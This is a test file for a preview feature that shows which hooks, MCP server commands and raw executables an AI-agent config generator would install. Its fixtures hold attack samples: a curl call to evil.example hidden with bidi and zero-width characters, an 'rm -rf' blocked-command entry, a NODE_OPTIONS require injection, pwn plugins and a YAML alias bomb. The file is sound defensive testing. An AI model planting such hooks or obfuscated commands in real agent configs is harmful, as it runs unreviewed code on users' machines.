import { afterEach, describe, expect, it } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { analyzeProject, type Logger } from "../build.js";
import { generate } from "../generators/index.js";
import { writeResult } from "../generators/writer.js";
import { PLATFORMS } from "../platforms.js";
import { parseFrontmatter } from "../utils/safe-matter.js";
import { __test as previewTest, previewInstalledExecution } from "./preview.js";
import { planRemoteCommands } from "./trust-gate.js";

const silent: Logger = {
  info: () => {},
  success: () => {},
  warn: () => {},
  error: () => {},
  dim: () => {},
  header: () => {},
};
const roots: string[] = [];
afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function sourceWith(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), "ulis-preview-"));
  roots.push(root);
  const dir = join(root, ".ulis");
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "config.yaml"), "version: 1\nname: preview\n");
  for (const [path, contents] of Object.entries(files)) {
    const full = join(dir, path);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, contents);
  }
  return dir;
}

/**
 * An independent, deliberately dumb scan of the generated text. It shares no code with the preview:
 * the preview parses each artifact and walks the object graph, this one just greps every line for a
 * `command` assignment. Agreement between two unrelated readings of the same bytes is the property
 * under test - if a generator ever emits a command in a shape the structured walk does not
 * recognise, this catches it, which is precisely the failure mode that produced four rounds of
 * bypasses.
 */
function commandsInGeneratedText(sourceDir: string): string[] {
  const project = analyzeProject({ sourceDir, logger: silent }).project;
  const found: string[] = [];
  for (const platform of PLATFORMS) {
    for (const artifact of generate(platform, project)?.artifacts ?? []) {
      const text = typeof artifact.contents === "string" ? artifact.contents : artifact.contents.toString("utf8");
      for (const line of text.split(/\r?\n/u)) {
        const match = /^[\s\-]*"?command"?\s*[:=]\s*(.+?),?\s*$/iu.exec(line);
        const value = match?.[1]?.replace(/^["']|["']$/gu, "");
        // A bare `[` opens OpenCode's array form; its argv is asserted by name in the next test.
        if (value && value !== "[" && value !== "{") found.push(value);
      }
    }
  }
  return found;
}

describe("previewInstalledExecution", () => {
  it("omits secret source excerpts from source and preset review errors", () => {
    const sourceDir = sourceWith({ "mcp.yaml": "servers: [\n  env: { PRIVATE: TOPSECRET }\n" });
    for (const presetOnly of [false, true]) {
      let message = "";
      try {
        planRemoteCommands({
          sourceDir: presetOnly ? undefined : sourceDir,
          presets: presetOnly ? [{ name: "remote", dir: sourceDir }] : [],
          platforms: ["codex"],
          destBase: join(sourceDir, "destination"),
        });
      } catch (error) {
        message = (error as Error).message;
      }
      expect(message).not.toContain("TOPSECRET");
      expect(message).toContain(join(sourceDir, "mcp.yaml"));
      expect(message).toContain("Flow sequence");
      expect(message).toContain("at: 3:1");
      expect(message).toContain("target: none");
    }
    const diagnostics: string[] = [];
    expect(() =>
      analyzeProject({ sourceDir, logger: { ...silent, error: (line) => diagnostics.push(line) } }),
    ).toThrow();
    expect(diagnostics.join("\n")).toContain("TOPSECRET");
  });

  it.each([
    ["agents/broken.md", "---js\n({ name: 'broken' })\n---\nBody\n", "JavaScript frontmatter"],
    ["mcp.yaml", "servers: [\n", "at:"],
  ])("includes %s diagnostics in source and preset review errors", (file, contents, reason) => {
    const sourceDir = sourceWith({ [file!]: contents! });
    for (const presetOnly of [false, true]) {
      try {
        planRemoteCommands({
          sourceDir: presetOnly ? undefined : sourceDir,
          presets: presetOnly ? [{ name: "remote", dir: sourceDir }] : [],
          platforms: ["codex"],
          destBase: join(sourceDir, "destination"),
        });
        throw new Error("Expected parsing to fail");
      } catch (error) {
        const message = (error as Error).message;
        expect(message).toContain(file!);
        expect(message).toContain(reason!);
      }
    }
    const diagnostics: string[] = [];
    let error: unknown;
    try {
      analyzeProject({ sourceDir, logger: { ...silent, error: (message) => diagnostics.push(message) } });
    } catch (caught) {
      error = caught;
    }
    expect(diagnostics).toHaveLength(1);
    expect(diagnostics[0]).toContain(file!);
    expect((error as Error).message).toBe("Parsing failed: 1 error(s). No files written.");
  });

  it("discloses an oversized skill whose transformed frontmatter installs a hook", () => {
    const sourceDir = sourceWith({
      "skills/large/SKILL.md":
        "---\nname: large\ndescription: Large\nhooks:\n  Stop:\n    - command: hidden-hook\n---\n" +
        "x".repeat(512 * 1024),
    });
    const result = generate("claude", analyzeProject({ sourceDir, logger: silent }).project)!;
    const out = join(sourceDir, "generated", "claude");
    writeResult(result, out, "claude", silent);
    expect(readFileSync(join(out, "skills/large/SKILL.md"), "utf8")).toContain("hidden-hook");
    expect(previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] })).toContain(
      "installs claude/skills/large/SKILL.md (contents not readable by the preview)",
    );
  });

  it.each(["raw/all/agents/large.md", "docs/large.md"])("discloses oversized copied content from %s", (path) => {
    const sourceDir = sourceWith({ [path]: "---\ncommand: hidden-hook\n---\n" + "x".repeat(512 * 1024) });
    const destination = path.replace("raw/all/", "");
    expect(previewInstalledExecution({ sourceDir, presets: [], platforms: ["opencode"] })).toContain(
      `installs opencode/${destination} (contents not readable by the preview)`,
    );
  });

  it("retains unreadable content disclosure through later raw merges", () => {
    const sourceDir = sourceWith({
      "raw/all/custom.json": JSON.stringify({ command: "hidden-hook", padding: "x".repeat(512 * 1024) }),
      "raw/claude/custom.json": "{}",
    });
    const out = join(sourceDir, "generated", "claude");
    writeResult(generate("claude", analyzeProject({ sourceDir, logger: silent }).project)!, out, "claude", silent);
    expect(JSON.parse(readFileSync(join(out, "custom.json"), "utf8")).command).toBe("hidden-hook");
    expect(previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] })).toContain(
      "installs claude/custom.json (contents not readable by the preview)",
    );
  });

  it.each(["opencode", "codex", "forgecode"] as const)("retains disclosure when %s appends after raw", (platform) => {
    const sourceDir = sourceWith({
      "raw/all/AGENTS.md": "---\ncommand: hidden-hook\n---\n" + "x".repeat(512 * 1024),
      "rules/style.md": "---\ndescription: Style\n---\nUse plain names.\n",
    });
    expect(previewInstalledExecution({ sourceDir, presets: [], platforms: [platform] })).toContain(
      `installs ${platform}/AGENTS.md (contents not readable by the preview)`,
    );
  });

  it.skipIf(process.platform === "win32" || process.getuid?.() === 0).each([
    ["file", "hidden/payload.md", 0, "hidden/payload.md"],
    ["directory", "hidden", 0, "hidden"],
    ["metadata", "hidden", 0o400, "hidden/payload.md"],
    ["root", ".", 0, "."],
  ] as const)("discloses unreadable raw %s", (kind, relative, mode, destination) => {
    const sourceDir = sourceWith({ "raw/claude/hidden/payload.md": "---\ncommand: hidden-hook\n---\n" });
    const path = join(sourceDir, "raw/claude", relative);
    chmodSync(path, mode);
    try {
      expect(previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] })).toContain(
        `installs claude/${destination} (contents not readable by the preview)`,
      );
    } finally {
      chmodSync(path, kind === "file" ? 0o600 : 0o700);
    }
  });

  // Every payload class found across four review rounds, in one source.
  const payloadSource = () =>
    sourceWith({
      "agents/evil.md": [
        "---",
        "description: Looks harmless",
        "tools:",
        "  read: true",
        "hooks:",
        "  Stop:",
        '    - command: "declared-hook"',
        "security:",
        "  blockedCommands:",
        "    - rm -rf",
        "---",
        "",
        "Body.",
        "",
      ].join("\n"),
      "mcp.yaml": ["servers:", "  local:", '    type: "local"', '    command: "spawned-server"', ""].join("\n"),
      "raw/claude/agents/pwn.md": [
        "---",
        "description: raw",
        "hooks:",
        "  SessionStart:",
        '    - command: "raw-hook"',
        "---",
        "",
      ].join("\n"),
      "raw/opencode/plugin/pwn.js": "export default () => {};\n",
    });

  it("names every command that appears in the generated output", () => {
    const sourceDir = payloadSource();
    const preview = previewInstalledExecution({ sourceDir, presets: [], platforms: [...PLATFORMS] }).join("\n");

    const commands = commandsInGeneratedText(sourceDir);
    expect(commands.length).toBeGreaterThan(0);
    for (const command of commands) {
      // The preview escapes for display, so compare on the distinctive part rather than verbatim.
      expect(preview).toContain(command.split(/\s/u)[0]!.replace(/^"/u, ""));
    }
  });

  it("covers each payload class: declared hook, derived hook, MCP spawn, raw content, raw location", () => {
    const preview = previewInstalledExecution({
      sourceDir: payloadSource(),
      presets: [],
      platforms: [...PLATFORMS],
    }).join("\n");

    expect(preview).toContain("declared-hook");
    expect(preview).toContain("Blocked by ULIS security policy");
    // Once per shape: a string `command` (claude/codex/cursor/forge) and OpenCode's argv array,
    // which an earlier version of the walk skipped entirely.
    expect(preview).toContain("spawned-server");
    expect(preview).toContain("opencode/opencode.json runs: spawned-server");
    expect(preview).toContain("raw-hook");
    expect(preview).toContain("opencode/plugin/pwn.js");
  });

  it("says nothing about a source that installs nothing executable", () => {
    const sourceDir = sourceWith({
      "agents/plain.md": ["---", "description: Plain", "tools:", "  read: true", "---", "", "Body.", ""].join("\n"),
      "rules/style.md": ["---", "description: Style", "---", "", "Prose.", ""].join("\n"),
    });

    expect(previewInstalledExecution({ sourceDir, presets: [], platforms: [...PLATFORMS] })).toEqual([]);
  });

  /**
   * The text scan is the only thing standing behind a format this module has no parser for, and
   * mutating it away used to leave the suite green. A minified one-line document is the shape that
   * defeated the earlier line-anchored version.
   */
  it("falls back to scanning text when a format has no parser", () => {
    const sourceDir = sourceWith({
      "raw/claude/hooks/handler": '{"hooks":{"SessionStart":[{"command":"text-scanned-command"}]}}',
      "raw/claude/settings.json":
        '// JSONC a parser rejects\n{"hooks":{"SessionStart":[{"command":"minified-command"}]}}',
    });

    const preview = previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] }).join("\n");
    expect(preview).toContain("text-scanned-command");
    expect(preview).toContain("minified-command");
  });

  /**
   * `CODE_EXTENSIONS` and `AUTOLOADED_DIRS` covered each other while the only test used
   * `plugin/pwn.js`, which satisfies both - deleting either rule left the suite green. One file
   * exercises each rule alone.
   */
  it("lists an executable file outside an auto-loaded directory, and an extensionless file inside one", () => {
    const sourceDir = sourceWith({
      "raw/claude/tools/helper.js": "module.exports = () => {};\n",
      "raw/claude/hooks/on-start": "#!/bin/sh\n",
    });

    const preview = previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] }).join("\n");
    // Executable by extension, nowhere near an auto-loaded directory.
    expect(preview).toContain("claude/tools/helper.js");
    // Executable by location, with no extension to go on.
    expect(preview).toContain("claude/hooks/on-start");
  });

  // Attacker-controlled data must not end the run with a stack overflow from somewhere unrelated.
  it("survives a pathologically nested raw config", () => {
    const depth = 40_000;
    const sourceDir = sourceWith({
      "raw/claude/settings.json": `${'{"a":'.repeat(depth)}1${"}".repeat(depth)}`,
    });

    expect(() => previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] })).not.toThrow();
  });

  it("escapes display controls found inside executable file content", () => {
    const sourceDir = sourceWith({
      "raw/claude/hooks/on-start.js": 'command = "curl https://evil.example/\u202Epayload\u200B";\n',
    });

    const preview = previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] }).join("\n");

    expect(preview).toContain("\\u202e");
    expect(preview).toContain("\\u200b");
    expect(preview).not.toContain("\u202E");
    expect(preview).not.toContain("\u200B");

    const runs = previewTest.runsLine("claude", "hooks/on-start.js", "runs: curl \u202Epayload\u200B");
    expect(runs).toContain("\\u202e");
    expect(runs).toContain("\\u200b");
    expect(runs).not.toContain("\u202E");
    expect(runs).not.toContain("\u200B");
  });

  // The writer deep-merges a raw fragment over the generated file, arrays replaced: previewing the
  // two separately showed the declared command while the fragment's args were what got installed.
  it("previews a generated command as a raw fragment rewrites it", () => {
    const sourceDir = sourceWith({
      "mcp.yaml": [
        "servers:",
        "  srv:",
        "    type: local",
        '    command: "sh"',
        '    args: ["-c", "echo SAFE"]',
        "",
      ].join("\n"),
      "raw/claude/.claude.json": JSON.stringify({ mcpServers: { srv: { args: ["-c", "echo UNREVIEWED"] } } }),
      "raw/all/.claude.json": JSON.stringify({ mcpServers: { srv: { env: { NODE_OPTIONS: "--require x" } } } }),
    });

    const preview = previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] });
    expect(preview).toContain('claude/.claude.json runs: sh -c "echo UNREVIEWED" (env: NODE_OPTIONS)');
    expect(preview.join("\n")).not.toContain("echo SAFE");
  });

  // Shared aliases doubled per level: 2^30 visits before the prompt, with no way to interrupt it.
  it("walks an acyclic YAML alias chain in linear time", () => {
    const chain = ["a0: &a0 [{ command: chained }]"];
    for (let level = 1; level <= 30; level += 1) chain.push(`a${level}: &a${level} [*a${level - 1}, *a${level - 1}]`);
    const sourceDir = sourceWith({ "raw/claude/agents/bomb.md": ["---", ...chain, "---", ""].join("\n") });

    const started = performance.now();
    const preview = previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] });
    expect(performance.now() - started).toBeLessThan(1000);
    expect(preview).toContain("claude/agents/bomb.md runs: chained");
  });

  it.each([...PLATFORMS])("previews %s skill hooks after stripping and native overrides", (platform) => {
    const sourceDir = sourceWith({
      "skills/evil/SKILL.md": `---
name: evil
description: Evil skill
hooks:
  Stop:
    - command: phantom-hook
platforms:
  claude:
    hooks: {}
  opencode:
    hooks:
      Stop:
        - command: native-hook
  cursor:
    hooks:
      Stop:
        - command: native-hook
  forgecode:
    hooks:
      Stop:
        - command: native-hook
---
Body.
`,
    });
    const project = analyzeProject({ sourceDir, logger: silent }).project;
    const result = generate(platform, project)!;
    const out = join(sourceDir, "generated", platform);
    writeResult(result, out, platform, silent);
    const path = join(platform === "forgecode" ? ".forge/skills" : "skills", "evil", "SKILL.md");
    const installed = parseFrontmatter(readFileSync(join(out, path), "utf8")).data;
    const preview = previewInstalledExecution({ sourceDir, presets: [], platforms: [platform] }).join("\n");
    expect(preview).not.toContain("phantom-hook");
    if (platform === "claude") expect(installed.hooks).toEqual({});
    else if (platform === "codex") expect(installed.hooks).toBeUndefined();
    else {
      expect(installed.hooks.Stop[0].command).toBe("native-hook");
      expect(preview).toContain(`${platform}/${path} runs: native-hook`);
    }
  });

  it("is deterministic, because the caller compares it against a list already shown", () => {
    const sourceDir = payloadSource();
    const inputs = { sourceDir, presets: [], platforms: [...PLATFORMS] };
    expect(previewInstalledExecution(inputs)).toEqual(previewInstalledExecution(inputs));
  });
});
